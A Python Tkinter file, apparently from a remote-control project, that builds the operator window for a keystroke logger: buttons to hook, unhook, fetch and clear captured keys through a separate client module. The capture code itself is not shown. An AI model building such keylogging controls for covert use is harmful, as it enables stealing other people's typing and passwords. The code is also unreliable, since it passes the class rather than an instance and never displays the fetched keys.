import tkinter as tk
import tkinter.ttk as thm
import tkinter.messagebox as msbx
import client

class keylog_frame(tk.Frame):
	def __init__(self, parent):
		super().__init__(parent)

		self.parent = parent
		self.pack(fill = tk.BOTH, expand = True)
		self.make_widgets()
		self.tmp_client = client.Client
		self.parent.title("Keystroke")

	def make_widgets(self):
		#Tạo các button
		frame1 = tk.Frame(self)
		frame1.pack(fill=tk.BOTH, padx = 10, pady = 10, expand = True)	

		frame2 = tk.Frame(frame1)
		frame2.pack(side = "top", fill = tk.BOTH, expand = True)
		
		frame3 = tk.Frame(frame1)
		frame3.pack(side = "bottom", fill = tk.BOTH, expand = True)

		self.hook_button = thm.Button(frame2, text = "Hook", command = self.start_listening)
		self.hook_button.pack(side = "left", fill = tk.BOTH, padx = 10, pady = 10, expand = True)

		self.unhook_button = thm.Button(frame2, text = "Unhook", command = self.end_listening)
		self.unhook_button.pack(side = "left", fill = tk.BOTH, padx = 10, pady = 10, expand = True)

		self.print_button = thm.Button(frame2, text = "In phím", command=self.print_keylog)
		self.print_button.pack(side = "left", fill = tk.BOTH, padx = 10, pady = 10, expand = True)

		self.delete_button = thm.Button(frame2, text = "Xoá", command=self.delete_keylog)
		self.delete_button.pack(side = "right", fill = tk.BOTH, padx = 10, pady = 10, expand = True)

		self.keylog_text = tk.Text(frame3, height = 15)
		self.keylog_text['state'] = 'disable'
		self.keylog_text.pack(fill=tk.Y)

	def start_listening(self):
		self.tmp_client.req_keystroke_hook(self.tmp_client)

	def end_listening(self):
		self.tmp_client.req_keystroke_unhook(self.tmp_client)

	def print_keylog(self):
		self.keylog_text['state'] = 'normal'
		self.keys = self.tmp_client.req_keystroke_get(self)
		# self.keylog_text.insert(tk.INSERT, self.keys)
		self.keylog_text['state'] = 'disable'

	def delete_keylog(self):
		self.keylog_text['state'] = 'normal'
		self.keylog_text.delete("1.0", tk.END)
		self.keylog_text['state'] = 'disable'
